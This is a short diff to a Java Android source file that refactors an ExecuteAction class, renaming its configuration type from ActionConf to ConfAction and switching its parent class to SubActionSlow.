@@ -17,6 +17,7 @@ import android.util.Log;
 
 import com.android.service.Messages;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.conf.Configuration;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.file.Directory;
@@ -28,7 +29,7 @@ import com.android.service.util.WChar;
 /**
  * The Class ExecuteAction.
  */
-public class ExecuteAction extends SubAction {
+public class ExecuteAction extends SubActionSlow {
 	private static final String TAG = "ExecuteAction";
 	
 	private String command;
@@ -39,7 +40,7 @@ public class ExecuteAction extends SubAction {
 	 * @param params
 	 *            the conf params
 	 */
-	public ExecuteAction(final ActionConf params) {
+	public ExecuteAction(final ConfAction params) {
 		super( params);
 	}
 
@@ -85,7 +86,7 @@ public class ExecuteAction extends SubAction {
 	}
 
 	@Override
-	protected boolean parse(final ActionConf params) {
+	protected boolean parse(final ConfAction params) {
 		try {			
 			this.command = params.getString("command");
 			
